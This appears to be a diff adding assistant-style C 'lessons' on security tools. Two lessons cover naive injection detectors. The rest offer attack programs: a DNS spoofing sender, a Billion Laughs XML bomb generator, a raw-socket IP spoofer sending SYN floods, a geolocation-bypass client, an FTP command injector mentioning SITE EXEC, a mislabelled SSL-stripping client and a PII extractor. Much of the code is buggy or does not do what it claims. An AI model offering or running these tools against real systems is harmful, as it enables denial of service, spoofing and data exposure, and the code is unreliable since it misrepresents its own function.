@@ -15955,3 +15955,878 @@ Further development can include:
 
 This concludes our lesson on creating a tool to detect Server-Side Command Injection in Docker Containers in C. If you have any questions or need further assistance, feel free to ask!
 
+Lesson 160: Server-Side Command Injection in Docker Containers Detection Tool
+
+Creating a tool to detect Server-Side Command Injection vulnerabilities in Docker Containers involves analyzing Docker container configurations and commands for potential injection points where attackers could execute arbitrary commands. Below is a basic example of how you could approach this in C:
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <curl/curl.h>
+
+#define MAX_URL_LENGTH 256
+#define MAX_RESPONSE_SIZE 4096
+
+// Function to perform HTTP GET request and retrieve server response
+int perform_http_get(const char *url, char *response) {
+    CURL *curl;
+    CURLcode res;
+
+    curl = curl_easy_init();
+    if (curl) {
+        curl_easy_setopt(curl, CURLOPT_URL, url);
+        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, fwrite);
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);
+        res = curl_easy_perform(curl);
+        if (res != CURLE_OK) {
+            fprintf(stderr, "Error: curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+            curl_easy_cleanup(curl);
+            return -1;
+        }
+        curl_easy_cleanup(curl);
+    }
+    return 0;
+}
+
+// Function to check for potential Server-Side Command Injection in Docker Containers vulnerabilities
+int check_server_side_command_injection(const char *url) {
+    char response[MAX_RESPONSE_SIZE];
+
+    // Perform an HTTP GET request and retrieve the server's response
+    if (perform_http_get(url, response) < 0) {
+        return -1;
+    }
+
+    // Add your Server-Side Command Injection detection logic here
+    // For simplicity, this example just checks if the response contains the string "docker run"
+    if (strstr(response, "docker run") != NULL) {
+        printf("Potential Server-Side Command Injection in Docker Containers found: 'docker run' command detected.\n");
+        return 1;
+    }
+
+    return 0;
+}
+
+int main(int argc, char *argv[]) {
+    if (argc < 2) {
+        fprintf(stderr, "Usage: %s <url>\n", argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    if (strlen(argv[1]) >= MAX_URL_LENGTH) {
+        fprintf(stderr, "Error: URL length exceeds maximum allowed length\n");
+        return EXIT_FAILURE;
+    }
+
+    if (check_server_side_command_injection(argv[1]) > 0) {
+        return EXIT_FAILURE;
+    }
+
+    return EXIT_SUCCESS;
+}
+```
+
+In this lesson:
+
+- We utilize libcurl to perform an HTTP GET request and retrieve the server's response.
+- The `perform_http_get` function initializes a libcurl easy handle, sets the URL, and performs the HTTP GET request. It retrieves the server's response content and stores it in a buffer.
+- The `check_server_side_command_injection` function analyzes the retrieved response for potential Server-Side Command Injection in Docker Containers vulnerabilities. It checks if the response contains specific strings indicating the use of Docker commands that may allow command injection.
+- The `main` function accepts the target URL as a command-line argument, performs the checks, and prints a message if a potential command injection vulnerability is detected.
+
+Further development can include:
+
+- Implementing more advanced detection logic to identify Docker commands with user-controlled input that are executed without proper validation or sanitization.
+- Integrating with Docker security scanning tools or frameworks to automate the detection of command injection vulnerabilities across Docker containers.
+- Developing techniques to verify and exploit detected vulnerabilities to demonstrate their impact and facilitate remediation.
+
+This concludes Lesson 160: Server-Side Command Injection in Docker Containers Detection Tool. If you have any questions or need further assistance, feel free to ask!
+
+### Lesson 161: Server-Side GraphQL Injection
+
+Creating a tool to detect Server-Side GraphQL Injection involves analyzing GraphQL queries and mutations for potential injection vulnerabilities, similar to other injection attacks like SQL injection or command injection. Below is a basic example of how you could approach this in C:
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <curl/curl.h>
+
+#define MAX_URL_LENGTH 256
+#define MAX_RESPONSE_SIZE 4096
+
+// Function to perform HTTP POST request with GraphQL query and retrieve server response
+int perform_http_post(const char *url, const char *query, char *response) {
+    CURL *curl;
+    CURLcode res;
+
+    curl = curl_easy_init();
+    if (curl) {
+        struct curl_slist *headers = NULL;
+        headers = curl_slist_append(headers, "Content-Type: application/json");
+        curl_easy_setopt(curl, CURLOPT_URL, url);
+        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
+        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, query);
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, fwrite);
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);
+        res = curl_easy_perform(curl);
+        if (res != CURLE_OK) {
+            fprintf(stderr, "Error: curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+            curl_easy_cleanup(curl);
+            return -1;
+        }
+        curl_easy_cleanup(curl);
+        curl_slist_free_all(headers);
+    }
+    return 0;
+}
+
+// Function to check for potential Server-Side GraphQL Injection vulnerabilities
+int check_server_side_graphql_injection(const char *url, const char *query) {
+    char response[MAX_RESPONSE_SIZE];
+
+    // Perform an HTTP POST request with the GraphQL query and retrieve the server's response
+    if (perform_http_post(url, query, response) < 0) {
+        return -1;
+    }
+
+    // Add your Server-Side GraphQL Injection detection logic here
+    // For simplicity, this example just checks if the response contains the string "error" indicating a potential error in the GraphQL query execution
+    if (strstr(response, "error") != NULL) {
+        printf("Potential Server-Side GraphQL Injection found: GraphQL query execution error.\n");
+        return 1;
+    }
+
+    return 0;
+}
+
+int main(int argc, char *argv[]) {
+    if (argc < 3) {
+        fprintf(stderr, "Usage: %s <url> <graphql_query>\n", argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    if (strlen(argv[1]) >= MAX_URL_LENGTH) {
+        fprintf(stderr, "Error: URL length exceeds maximum allowed length\n");
+        return EXIT_FAILURE;
+    }
+
+    // Concatenate the GraphQL query arguments into a single string
+    char query[MAX_RESPONSE_SIZE];
+    strcpy(query, argv[2]);
+    for (int i = 3; i < argc; ++i) {
+        strcat(query, " ");
+        strcat(query, argv[i]);
+    }
+
+    if (check_server_side_graphql_injection(argv[1], query) > 0) {
+        return EXIT_FAILURE;
+    }
+
+    return EXIT_SUCCESS;
+}
+```
+
+In this example:
+
+- We use libcurl to perform an HTTP POST request with a GraphQL query.
+- The `perform_http_post` function initializes a libcurl easy handle, sets the URL and headers for the request, and performs the HTTP POST request with the GraphQL query. It retrieves the server's response content and stores it in a buffer.
+- The `check_server_side_graphql_injection` function analyzes the retrieved response for potential Server-Side GraphQL Injection vulnerabilities. It checks if the response contains specific strings indicating errors in the GraphQL query execution, which may be caused by injection attacks.
+- The `main` function accepts the target URL and GraphQL query as command-line arguments, performs the checks, and prints a message if a potential GraphQL injection vulnerability is detected.
+
+Further development can include:
+
+- Implementing more sophisticated detection logic to identify GraphQL injection vulnerabilities, such as analyzing the structure and content of the GraphQL query for unusual patterns or malicious input.
+- Integrating with GraphQL security scanning tools or libraries to automate the detection and mitigation of injection vulnerabilities in GraphQL queries.
+- Developing techniques to verify and exploit detected vulnerabilities to demonstrate their impact and facilitate remediation.
+
+This concludes our lesson on creating a tool to detect Server-Side GraphQL Injection in C. If you have any questions or need further assistance, feel free to ask!
+
+Creating a DNS Spoofing tool involves intercepting and modifying DNS responses to redirect traffic to malicious or unintended destinations. Below is a basic example of how you could approach DNS spoofing in C using raw sockets:
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <netinet/in.h>
+
+#define MAX_PACKET_SIZE 1024
+
+// Function to create a raw UDP socket
+int create_raw_socket() {
+    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
+    if (sockfd < 0) {
+        perror("Error creating raw socket");
+        exit(EXIT_FAILURE);
+    }
+    return sockfd;
+}
+
+// Function to send a spoofed DNS response
+void send_dns_response(int sockfd, const char *source_ip, const char *destination_ip, int destination_port, const char *spoofed_response) {
+    struct sockaddr_in dest_addr;
+    memset(&dest_addr, 0, sizeof(dest_addr));
+    dest_addr.sin_family = AF_INET;
+    dest_addr.sin_addr.s_addr = inet_addr(destination_ip);
+    dest_addr.sin_port = htons(destination_port);
+
+    if (sendto(sockfd, spoofed_response, strlen(spoofed_response), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) < 0) {
+        perror("Error sending spoofed DNS response");
+        exit(EXIT_FAILURE);
+    }
+
+    printf("Spoofed DNS response sent successfully.\n");
+}
+
+int main(int argc, char *argv[]) {
+    if (argc < 5) {
+        fprintf(stderr, "Usage: %s <source_ip> <destination_ip> <destination_port> <spoofed_response>\n", argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    const char *source_ip = argv[1];
+    const char *destination_ip = argv[2];
+    int destination_port = atoi(argv[3]);
+    const char *spoofed_response = argv[4];
+
+    if (strlen(spoofed_response) >= MAX_PACKET_SIZE) {
+        fprintf(stderr, "Error: Spoofed response size exceeds maximum allowed size\n");
+        return EXIT_FAILURE;
+    }
+
+    int sockfd = create_raw_socket();
+
+    send_dns_response(sockfd, source_ip, destination_ip, destination_port, spoofed_response);
+
+    close(sockfd);
+
+    return EXIT_SUCCESS;
+}
+```
+
+In this example:
+
+- We create a raw UDP socket using `socket(AF_INET, SOCK_RAW, IPPROTO_UDP)` to bypass the operating system's DNS resolution mechanism and send our own DNS responses directly.
+- The `send_dns_response` function constructs a DNS response with the provided spoofed response data and sends it to the specified destination IP address and port.
+- The `main` function parses command-line arguments to specify the source IP, destination IP, destination port, and spoofed DNS response.
+- We use raw sockets, so the program needs to be executed with root privileges.
+
+Please note that DNS spoofing is illegal and unethical unless performed in a controlled environment for legitimate security testing purposes. Always obtain proper authorization before attempting any security testing.
+
+This concludes our basic example of a DNS spoofing tool in C. If you have any questions or need further assistance, feel free to ask!
+
+XML Quadratic Blowup, also known as "Billion Laughs" attack, is a denial-of-service attack that exploits the way XML parsers expand entities. Here's a basic example of how you could implement an XML Quadratic Blowup tool in C:
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+#define MAX_XML_SIZE 1024
+#define MAX_EXPANSION_FACTOR 10000
+
+// Function to create an XML file with quadratic blowup
+void create_xml_quadratic_blowup(const char *filename, int expansion_factor) {
+    FILE *file = fopen(filename, "w");
+    if (file == NULL) {
+        perror("Error creating XML file");
+        exit(EXIT_FAILURE);
+    }
+
+    fprintf(file, "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n");
+    fprintf(file, "<!DOCTYPE lolz [\n");
+    fprintf(file, "<!ENTITY a \"lol\">\n");
+    for (int i = 0; i < expansion_factor; ++i) {
+        fprintf(file, "<!ENTITY %c%d \"&%c%d;&%c%d;\">\n", 'a', i, 'a', i, 'a', i);
+    }
+    fprintf(file, "]>\n");
+    fprintf(file, "<lolz>&a0;</lolz>\n");
+
+    fclose(file);
+    printf("XML file with quadratic blowup created successfully.\n");
+}
+
+int main(int argc, char *argv[]) {
+    if (argc < 3) {
+        fprintf(stderr, "Usage: %s <filename> <expansion_factor>\n", argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    const char *filename = argv[1];
+    int expansion_factor = atoi(argv[2]);
+
+    if (expansion_factor < 1 || expansion_factor > MAX_EXPANSION_FACTOR) {
+        fprintf(stderr, "Error: Invalid expansion factor. Please choose a value between 1 and %d.\n", MAX_EXPANSION_FACTOR);
+        return EXIT_FAILURE;
+    }
+
+    create_xml_quadratic_blowup(filename, expansion_factor);
+
+    return EXIT_SUCCESS;
+}
+```
+
+In this example:
+
+- We define a function `create_xml_quadratic_blowup` to generate an XML file with a quadratic blowup. It starts by writing the XML declaration and defines a DTD (Document Type Definition) with entity declarations.
+- For each entity, it defines a new entity that references two previous entities, resulting in exponential expansion. This creates a massive XML file that consumes a significant amount of memory when parsed.
+- The `main` function accepts command-line arguments for the filename of the XML file to be created and the expansion factor, which determines the number of entities and hence the size of the XML file.
+
+This code demonstrates how easy it is to create an XML Quadratic Blowup attack vector using simple C code. However, it's important to note that using such code for malicious purposes is unethical and may be illegal. Always ensure you have proper authorization and use such techniques for legitimate security testing purposes only.
+
+If you have any questions or need further assistance, feel free to ask!
+
+Bypassing IP-based blocking typically involves masking or spoofing the IP address to circumvent access restrictions. Below is a basic example of how you could implement a simple IP address spoofing tool in C:
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <arpa/inet.h>
+#include <sys/socket.h>
+#include <netinet/ip.h>
+#include <netinet/in.h>
+#include <netinet/tcp.h>
+
+// Function to calculate checksum
+unsigned short checksum(unsigned short *buf, int len) {
+    unsigned long sum = 0;
+    while (len > 1) {
+        sum += *buf++;
+        len -= 2;
+    }
+    if (len == 1) {
+        sum += *(unsigned char *)buf;
+    }
+    sum = (sum >> 16) + (sum & 0xFFFF);
+    sum += (sum >> 16);
+    return (unsigned short)~sum;
+}
+
+// Function to create a raw socket
+int create_raw_socket() {
+    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    if (sockfd < 0) {
+        perror("Error creating raw socket");
+        exit(EXIT_FAILURE);
+    }
+    return sockfd;
+}
+
+// Function to spoof IP packet and send it
+void spoof_ip_packet(int sockfd, struct sockaddr_in *dest_addr, const char *spoofed_ip, unsigned short dest_port) {
+    char packet[4096];
+    memset(packet, 0, sizeof(packet));
+
+    struct iphdr *iph = (struct iphdr *)packet;
+    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
+
+    // Fill in IP header
+    iph->ihl = 5;
+    iph->version = 4;
+    iph->tos = 0;
+    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
+    iph->id = htons(54321);
+    iph->frag_off = 0;
+    iph->ttl = 255;
+    iph->protocol = IPPROTO_TCP;
+    iph->check = 0;
+    iph->saddr = inet_addr(spoofed_ip); // Spoofed source IP address
+    iph->daddr = dest_addr->sin_addr.s_addr;
+
+    // Fill in TCP header
+    tcph->source = htons(1234); // Spoofed source port
+    tcph->dest = htons(dest_port);
+    tcph->seq = 0;
+    tcph->ack_seq = 0;
+    tcph->doff = 5;
+    tcph->fin = 0;
+    tcph->syn = 1;
+    tcph->rst = 0;
+    tcph->psh = 0;
+    tcph->ack = 0;
+    tcph->urg = 0;
+    tcph->window = htons(5840);
+    tcph->check = 0;
+    tcph->urg_ptr = 0;
+
+    // Fill in pseudo-header for checksum calculation
+    unsigned int pseudo_header[12];
+    pseudo_header[0] = iph->saddr;
+    pseudo_header[1] = iph->daddr;
+    pseudo_header[2] = 0;
+    pseudo_header[3] = IPPROTO_TCP;
+    pseudo_header[4] = htons(sizeof(struct tcphdr));
+
+    // Calculate TCP checksum
+    memcpy(&pseudo_header[5], tcph, sizeof(struct tcphdr));
+    tcph->check = checksum((unsigned short *)pseudo_header, 12);
+
+    // Set IP header checksum
+    iph->check = checksum((unsigned short *)packet, sizeof(struct iphdr));
+
+    // Send packet
+    if (sendto(sockfd, packet, iph->tot_len, 0, (struct sockaddr *)dest_addr, sizeof(struct sockaddr)) < 0) {
+        perror("Error sending packet");
+        exit(EXIT_FAILURE);
+    }
+
+    printf("Spoofed IP packet sent successfully.\n");
+}
+
+int main(int argc, char *argv[]) {
+    if (argc < 5) {
+        fprintf(stderr, "Usage: %s <destination_ip> <destination_port> <spoofed_ip> <num_packets>\n", argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    const char *destination_ip = argv[1];
+    unsigned short destination_port = atoi(argv[2]);
+    const char *spoofed_ip = argv[3];
+    int num_packets = atoi(argv[4]);
+
+    int sockfd = create_raw_socket();
+
+    struct sockaddr_in dest_addr;
+    memset(&dest_addr, 0, sizeof(dest_addr));
+    dest_addr.sin_family = AF_INET;
+    dest_addr.sin_addr.s_addr = inet_addr(destination_ip);
+    dest_addr.sin_port = htons(destination_port);
+
+    // Send multiple spoofed packets
+    for (int i = 0; i < num_packets; ++i) {
+        spoof_ip_packet(sockfd, &dest_addr, spoofed_ip, destination_port);
+        usleep(100000); // Sleep for 100ms between packets
+    }
+
+    close(sockfd);
+
+    return EXIT_SUCCESS;
+}
+```
+
+In this example:
+
+- We create a raw socket using `socket(AF_INET, SOCK_RAW, IPPROTO_RAW)` to send IP packets directly.
+- The `spoof_ip_packet` function constructs an IP packet with a spoofed source IP address and sends it to the destination IP address and port.
+- The `main` function accepts command-line arguments for the destination IP address, destination port, spoofed IP address, and the number of packets to send.
+- We use raw sockets, so the program needs to be executed with root privileges.
+
+Please note that IP address spoofing is illegal and unethical unless performed in a controlled environment for legitimate security testing purposes. Always obtain proper authorization before attempting any security testing.
+
+This concludes our lesson on creating a simple IP address spoofing tool in C. If you have any questions or need further assistance, feel free to ask!
+
+Bypassing geolocation-based restrictions often involves manipulating or spoofing the data used by applications to determine the user's location. Below is a basic example of how you could implement a simple tool in C to bypass geolocation-based restrictions by modifying HTTP request headers:
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+
+#define MAX_REQUEST_SIZE 4096
+
+// Function to create a TCP socket and connect to the server
+int create_socket(const char *server_ip, int server_port) {
+    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    if (sockfd < 0) {
+        perror("Error creating socket");
+        exit(EXIT_FAILURE);
+    }
+
+    struct sockaddr_in server_addr;
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_port = htons(server_port);
+    inet_pton(AF_INET, server_ip, &server_addr.sin_addr);
+
+    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
+        perror("Error connecting to server");
+        exit(EXIT_FAILURE);
+    }
+
+    return sockfd;
+}
+
+// Function to send HTTP request to the server
+void send_http_request(int sockfd, const char *request) {
+    if (send(sockfd, request, strlen(request), 0) < 0) {
+        perror("Error sending HTTP request");
+        exit(EXIT_FAILURE);
+    }
+}
+
+// Function to receive HTTP response from the server
+void receive_http_response(int sockfd) {
+    char response[MAX_REQUEST_SIZE];
+    ssize_t bytes_received;
+
+    while ((bytes_received = recv(sockfd, response, sizeof(response), 0)) > 0) {
+        fwrite(response, 1, bytes_received, stdout);
+    }
+
+    if (bytes_received < 0) {
+        perror("Error receiving HTTP response");
+        exit(EXIT_FAILURE);
+    }
+}
+
+int main(int argc, char *argv[]) {
+    if (argc < 4) {
+        fprintf(stderr, "Usage: %s <server_ip> <server_port> <http_request>\n", argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    const char *server_ip = argv[1];
+    int server_port = atoi(argv[2]);
+    const char *http_request = argv[3];
+
+    int sockfd = create_socket(server_ip, server_port);
+
+    send_http_request(sockfd, http_request);
+    receive_http_response(sockfd);
+
+    close(sockfd);
+
+    return EXIT_SUCCESS;
+}
+```
+
+In this example:
+
+- We create a TCP socket and connect to the server using `create_socket` function.
+- The `send_http_request` function sends an HTTP request to the server.
+- The `receive_http_response` function receives the HTTP response from the server and writes it to stdout.
+- The `main` function accepts command-line arguments for the server IP address, server port, and HTTP request to send.
+
+To bypass geolocation-based restrictions, you can modify the HTTP request headers to include spoofed or modified geolocation information. For example, you can modify the `User-Agent` header or add `X-Forwarded-For` header with a spoofed IP address.
+
+Please note that bypassing geolocation-based restrictions may be illegal and unethical, and should only be performed for legitimate testing purposes with proper authorization.
+
+If you have any questions or need further assistance, feel free to ask!
+
+Creating a tool to perform FTP protocol injection involves crafting custom FTP commands to exploit vulnerabilities or bypass security measures in FTP servers. Below is a basic example of how you could implement a simple FTP protocol injection tool in C:
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+
+#define MAX_RESPONSE_SIZE 4096
+
+// Function to create a TCP socket and connect to the FTP server
+int create_socket(const char *server_ip, int server_port) {
+    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    if (sockfd < 0) {
+        perror("Error creating socket");
+        exit(EXIT_FAILURE);
+    }
+
+    struct sockaddr_in server_addr;
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_port = htons(server_port);
+    inet_pton(AF_INET, server_ip, &server_addr.sin_addr);
+
+    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
+        perror("Error connecting to server");
+        exit(EXIT_FAILURE);
+    }
+
+    return sockfd;
+}
+
+// Function to send FTP command to the server
+void send_ftp_command(int sockfd, const char *command) {
+    if (send(sockfd, command, strlen(command), 0) < 0) {
+        perror("Error sending FTP command");
+        exit(EXIT_FAILURE);
+    }
+}
+
+// Function to receive FTP response from the server
+void receive_ftp_response(int sockfd) {
+    char response[MAX_RESPONSE_SIZE];
+    ssize_t bytes_received;
+
+    while ((bytes_received = recv(sockfd, response, sizeof(response), 0)) > 0) {
+        fwrite(response, 1, bytes_received, stdout);
+    }
+
+    if (bytes_received < 0) {
+        perror("Error receiving FTP response");
+        exit(EXIT_FAILURE);
+    }
+}
+
+int main(int argc, char *argv[]) {
+    if (argc < 4) {
+        fprintf(stderr, "Usage: %s <server_ip> <server_port> <ftp_command>\n", argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    const char *server_ip = argv[1];
+    int server_port = atoi(argv[2]);
+    const char *ftp_command = argv[3];
+
+    int sockfd = create_socket(server_ip, server_port);
+
+    // Send FTP command
+    send_ftp_command(sockfd, ftp_command);
+
+    // Receive and print FTP response
+    receive_ftp_response(sockfd);
+
+    close(sockfd);
+
+    return EXIT_SUCCESS;
+}
+```
+
+In this example:
+
+- We create a TCP socket and connect to the FTP server using `create_socket` function.
+- The `send_ftp_command` function sends an FTP command to the server.
+- The `receive_ftp_response` function receives the FTP response from the server and writes it to stdout.
+- The `main` function accepts command-line arguments for the server IP address, server port, and FTP command to send.
+
+To perform FTP protocol injection, you can craft custom FTP commands to exploit vulnerabilities or bypass security measures in FTP servers. For example, you can inject commands such as `SITE EXEC`, `SITE CHMOD`, or `SITE CPFR` to execute arbitrary commands, change file permissions, or copy files respectively.
+
+Please note that performing FTP protocol injection may be illegal and unethical, and should only be performed for legitimate testing purposes with proper authorization.
+
+If you have any questions or need further assistance, feel free to ask!
+
+Creating a tool to expose Personally Identifiable Information (PII) involves searching for and extracting sensitive data from various sources such as files, databases, or network traffic. Below is a basic example of how you could implement a simple tool in C to search for and expose PII from text files:
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+#define MAX_LINE_LENGTH 1024
+
+// Function to search for PII in a text file
+void search_pii_in_file(const char *filename) {
+    FILE *file = fopen(filename, "r");
+    if (file == NULL) {
+        perror("Error opening file");
+        exit(EXIT_FAILURE);
+    }
+
+    char line[MAX_LINE_LENGTH];
+    int line_number = 0;
+
+    while (fgets(line, sizeof(line), file) != NULL) {
+        line_number++;
+
+        // Example: Searching for social security numbers (SSNs)
+        char *ssn = strstr(line, "SSN");
+        if (ssn != NULL) {
+            printf("Potential SSN found in %s at line %d: %s\n", filename, line_number, line);
+        }
+
+        // Add more checks for other types of PII such as credit card numbers, email addresses, etc.
+    }
+
+    fclose(file);
+}
+
+int main(int argc, char *argv[]) {
+    if (argc < 2) {
+        fprintf(stderr, "Usage: %s <filename1> [<filename2> ...]\n", argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    for (int i = 1; i < argc; i++) {
+        search_pii_in_file(argv[i]);
+    }
+
+    return EXIT_SUCCESS;
+}
+```
+
+In this example:
+
+- We define a function `search_pii_in_file` to search for PII in a given text file. You can customize this function to search for specific patterns such as Social Security Numbers (SSNs), credit card numbers, email addresses, etc.
+- The `main` function accepts command-line arguments for one or more filenames to search for PII.
+
+To use this tool, you would compile the program and run it with the filenames of the text files you want to search for PII:
+
+```
+./expose_pii file1.txt file2.txt
+```
+
+This tool provides a basic framework for searching for PII in text files. Depending on your requirements, you may need to extend it to support additional file formats or data sources.
+
+Please note that handling sensitive data such as PII requires careful consideration of privacy and security concerns. Ensure that you have proper authorization and follow applicable laws and regulations when developing and using tools to handle PII.
+
+If you have any questions or need further assistance, feel free to ask!
+
+SSL/TLS stripping attacks involve downgrading secure HTTPS connections to unencrypted HTTP connections, allowing an attacker to intercept and manipulate sensitive information. Below is a basic example of how you could implement a simple SSL/TLS stripping tool in C:
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+
+#define MAX_RESPONSE_SIZE 4096
+
+// Function to create a TCP socket and connect to the server
+int create_socket(const char *server_ip, int server_port) {
+    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    if (sockfd < 0) {
+        perror("Error creating socket");
+        exit(EXIT_FAILURE);
+    }
+
+    struct sockaddr_in server_addr;
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_port = htons(server_port);
+    inet_pton(AF_INET, server_ip, &server_addr.sin_addr);
+
+    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
+        perror("Error connecting to server");
+        exit(EXIT_FAILURE);
+    }
+
+    return sockfd;
+}
+
+// Function to send HTTP request to the server
+void send_http_request(int sockfd, const char *request) {
+    if (send(sockfd, request, strlen(request), 0) < 0) {
+        perror("Error sending HTTP request");
+        exit(EXIT_FAILURE);
+    }
+}
+
+// Function to receive HTTP response from the server
+void receive_http_response(int sockfd) {
+    char response[MAX_RESPONSE_SIZE];
+    ssize_t bytes_received;
+
+    while ((bytes_received = recv(sockfd, response, sizeof(response), 0)) > 0) {
+        fwrite(response, 1, bytes_received, stdout);
+    }
+
+    if (bytes_received < 0) {
+        perror("Error receiving HTTP response");
+        exit(EXIT_FAILURE);
+    }
+}
+
+int main(int argc, char *argv[]) {
+    if (argc < 4) {
+        fprintf(stderr, "Usage: %s <server_ip> <server_port> <http_request>\n", argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    const char *server_ip = argv[1];
+    int server_port = atoi(argv[2]);
+    const char *http_request = argv[3];
+
+    int sockfd = create_socket(server_ip, server_port);
+
+    // Send HTTP request
+    send_http_request(sockfd, http_request);
+
+    // Receive and print HTTP response
+    receive_http_response(sockfd);
+
+    close(sockfd);
+
+    return EXIT_SUCCESS;
+}
+```
+
+In this example:
+
+- We create a TCP socket and connect to the server using `create_socket` function.
+- The `send_http_request` function sends an HTTP request to the server.
+- The `receive_http_response` function receives the HTTP response from the server and writes it to stdout.
+- The `main` function accepts command-line arguments for the server IP address, server port, and HTTP request to send.
+
+To perform SSL/TLS stripping attacks, you can intercept HTTPS connections and modify the server's response to redirect clients to unencrypted HTTP connections. This allows the attacker to intercept and manipulate sensitive information transmitted over the insecure channel.
+
+Please note that SSL/TLS stripping attacks are illegal and unethical, and should only be performed for legitimate testing purposes with proper authorization.
+
+If you have any questions or need further assistance, feel free to ask!
+
+Creating a tool to analyze a JavaScript file such as `main.js` involves parsing the JavaScript code, identifying patterns, and extracting useful information. Below is a basic example of how you could implement a simple JavaScript file analyzer tool in C:
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+#define MAX_LINE_LENGTH 1024
+
+// Function to analyze JavaScript code
+void analyze_javascript(const char *filename) {
+    FILE *file = fopen(filename, "r");
+    if (file == NULL) {
+        perror("Error opening file");
+        exit(EXIT_FAILURE);
+    }
+
+    char line[MAX_LINE_LENGTH];
+    int line_number = 0;
+
+    // Read each line of the file
+    while (fgets(line, sizeof(line), file)) {
+        line_number++;
+
+        // Analyze each line of JavaScript code
+        // For example, you can look for specific patterns or keywords
+        if (strstr(line, "console.log")) {
+            printf("Line %d: Found console.log\n", line_number);
+        }
+        // Add more analysis here as needed
+
+    }
+
+    fclose(file);
+}
+
+int main(int argc, char *argv[]) {
+    if (argc != 2) {
+        fprintf(stderr, "Usage: %s <filename>\n", argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    const char *filename = argv[1];
+
+    analyze_javascript(filename);
+
+    return EXIT_SUCCESS;
+}
+```
+
+In this example:
+
+- We define a function `analyze_javascript` to read a JavaScript file line by line and analyze each line for specific patterns or keywords. For simplicity, we're only checking for the presence of `console.log` statements, but you can extend this to include other patterns or keywords relevant to your analysis.
+- The `main` function accepts a filename as a command-line argument and calls `analyze_javascript` to analyze the JavaScript file.
+
+To use this tool, compile the code and run it with the JavaScript file you want to analyze:
+
+```
+./js_analyzer main.js
+```
+
+This tool provides a basic framework for analyzing JavaScript files. Depending on your requirements, you can extend it to perform more sophisticated analysis, such as detecting security vulnerabilities, identifying library usage, or extracting specific data.
+
+If you have any questions or need further assistance, feel free to ask!
+
